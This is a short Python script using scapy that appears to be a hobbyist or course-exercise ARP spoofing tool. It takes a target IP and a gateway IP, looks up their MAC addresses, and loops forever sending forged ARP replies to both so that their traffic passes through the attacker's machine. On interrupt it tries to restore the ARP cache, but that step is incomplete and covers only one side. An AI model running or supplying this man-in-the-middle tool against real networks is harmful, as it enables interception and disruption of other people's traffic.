#!/usr/bin/env python

#   scapy.ls(scapy.ARP) -> [op] it's set to 1 by default, this means it's a request so we need
#   to set it to 2, to act like a response

import optparse
import scapy.all as scapy
import time
import sys


def get_arguments():
    parser = optparse.OptionParser()
    parser.add_option("-t", "--target", dest="target_ip", help="Target IP Address")
    parser.add_option("-g", "--gateway", dest="gateway", help="Target Source Gateway")
    (options, arguments) = parser.parse_args()
    if not options.target_ip:
        parser.error("[-] Please specify target's IP Address")
    elif not options.gateway:
        parser.error("[-] Please specify the source gateway")
    return options


def get_mac(ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    # print(broadcast.show())
    arp_request_broadcast = broadcast/arp_request
    # print(arp_request_broadcast.show())
    answer_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]
    # unanswered_list = scapy.srp(arp_request_broadcast, timeout=2, verbose=False)[1]
    # print(answer_list.show())
    # print(unanswered_list.show())

    return answer_list[0][1].hwsrc


def spoof():
    options = get_arguments()
    try:
        target_mac = get_mac(options.target_ip)
        source_mac = get_mac(options.gateway)
    except IndexError:
        print("[-] Found an error on Source and Target IP please, try again...")
        exit()
    #   Creating ARP Response
    packet_target = scapy.ARP(op=2, pdst=options.target_ip, hwdst=target_mac, psrc=options.gateway)
    packet_source = scapy.ARP(op=2, pdst=options.gateway, hwdst=source_mac, psrc=options.target_ip)
    # packet_target.show()
    #   Sending the Packet
    scapy.send(packet_target, verbose=False)
    scapy.send(packet_source, verbose=False)


def redirect():
    options = get_arguments()
    target_mac = get_mac(options.target_ip)
    source_mac = get_mac(options.gateway)
    #   Creating ARP Response
    if (options.gateway[len(options.gateway)-1] == "1") and (options.gateway[len(options.gateway) - 2] == "."):
        packet_target = scapy.ARP(op=2, pdst=options.target_ip, hwdst=target_mac, psrc=options.gateway,
                                  hwsrc=source_mac)
        scapy.send(packet_target, verbose=False)
        print("\r[-] Redirecting... Please wait.\n")
        time.sleep(2)
    else:
        print("\n[+] Redirecting main source")

        #On psrc, if we dont specify the gateway source mac address, scapy will put our own mac address (hwsrc own)


sent_packets_counts = 0
try:
    while True:
        spoof()
        sent_packets_counts = sent_packets_counts + 2
        #print("\r") is useful and elegant to dynamically print everytime on the same lane
        print("\r[+] Packets Sent: " + str(sent_packets_counts)),
        #Flush buffer to print it on screen
        sys.stdout.flush()
        time.sleep(2)
except KeyboardInterrupt:
    redirect()
    print("\n[-] Quitting...")


    #On python3 would be:
    #while True:
    #spoof()
    #sent_packets_counts = sent_packets_counts + 2
    #print("\r[+] Packets Sent: " + str(sent_packets_counts), end="")
    #time.sleep(2)
